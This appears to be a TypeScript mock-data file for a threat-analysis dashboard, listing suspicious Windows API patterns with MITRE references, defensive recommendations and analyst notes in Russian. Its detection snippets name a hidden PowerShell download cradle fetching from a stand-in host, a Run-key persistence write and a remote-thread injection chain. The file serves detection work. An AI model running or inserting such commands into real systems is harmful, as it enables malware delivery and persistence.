import type { AnalystNote, InsightPattern } from '../types';

export const suspiciousApiPatterns: InsightPattern[] = [
  { id: 'api-1', title: 'Remote Thread Injection', severity: 'critical', description: 'Выделение памяти с последующим созданием удалённого потока.', reference: 'T1055', snippet: 'VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread' },
  { id: 'api-2', title: 'Persistence через Registry Startup', severity: 'high', description: 'Запись Run-ключей с исполняемыми путями в пользовательских директориях.', reference: 'T1547.001', snippet: 'RegSetValueEx(HKCU\\...\\Run, "%TEMP%\\update.exe")' },
  { id: 'api-3', title: 'Скриптовая download cradle', severity: 'high', description: 'PowerShell web request с последующим выполнением команды.', reference: 'T1059.001', snippet: 'powershell -w hidden Invoke-WebRequest example.test/payload' },
];

export const recommendations: InsightPattern[] = [
  { id: 'rec-1', title: 'Усилить логирование PowerShell', severity: 'high', description: 'Включить script block logging и constrained language mode на приоритетных активах.' },
  { id: 'rec-2', title: 'Блокировать запуск из Temp', severity: 'medium', description: 'Добавить политики application control для запусков из temp и downloads.' },
  { id: 'rec-3', title: 'Мониторить Run-ключи', severity: 'high', description: 'Повысить приоритет детекта для startup persistence вместе с неподписанными бинарями.' },
];

export const analystNotes: AnalystNote[] = [
  { id: 'note-1', author: 'M. Karimov', timestamp: new Date(Date.now() - 86_000_000).toISOString(), body: 'Кластер кампании похож на commodity loader tradecraft, но именование C2 URI отличается от прошлой недели.' },
  { id: 'note-2', author: 'D. Yunusova', timestamp: new Date(Date.now() - 42_000_000).toISOString(), body: 'Приоритизировать для ручной проверки образцы с высокой энтропией секций и созданием дочернего PowerShell-процесса.' },
  { id: 'note-3', author: 'A. Saidov', timestamp: new Date(Date.now() - 9_000_000).toISOString(), body: 'Таблица IOC содержит только безопасные documentation IP ranges; обогащение production-сети не выполняется.' },
];
